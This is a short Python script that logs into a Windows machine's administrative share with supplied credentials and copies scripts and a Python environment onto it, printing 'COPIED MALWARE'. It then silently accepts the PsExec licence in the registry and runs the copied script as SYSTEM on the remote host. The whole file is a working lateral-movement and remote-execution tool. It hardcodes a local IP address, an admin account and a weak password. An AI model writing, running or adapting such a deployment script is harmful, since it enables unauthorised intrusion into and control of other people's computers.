import os


def main(ip, user, password):
    os.popen('Net use * /delete /Y').read()
    print('STARTING')
    os.popen(r'Net use h: \\' + ip + r'\c$ /user:"' + user + r'" "' + password + '" /p:yes').read()
    print("CONNECTED")
    print(str(os.popen(r'copy ".\initiator.py" "h:\"  /Y').read()))
    print(str(os.popen(r'copy "..\FileTransfer.py" "h:\"  /Y').read()))
    print(str(os.popen(r'copy "..\myenv" "h:\"  /Y /E').read()))
    print("COPIED MALWARE")
    print(str(os.popen('reg.exe ADD HKCU\Software\Sysinternals\PSexec /v EulaAccepted /t REG_DWORD /d 1 /f')))
    os.popen('Net use * /delete /Y').read()
    x = os.popen(r'Psexec \\' + ip + ' -u ' + user + ' -p ' + password + ' -i -s c:/myenv/Scripts/python.exe "c:\initiator.py"')
    print(str(x.read()))
    x = x.close()
    if (x == None or x == 0):
        return True
    else:
        return str(x)


if __name__ == '__main__':
    main('192.168.68.122', 'LAPTOP-6IK2H466\\admin', '123456')
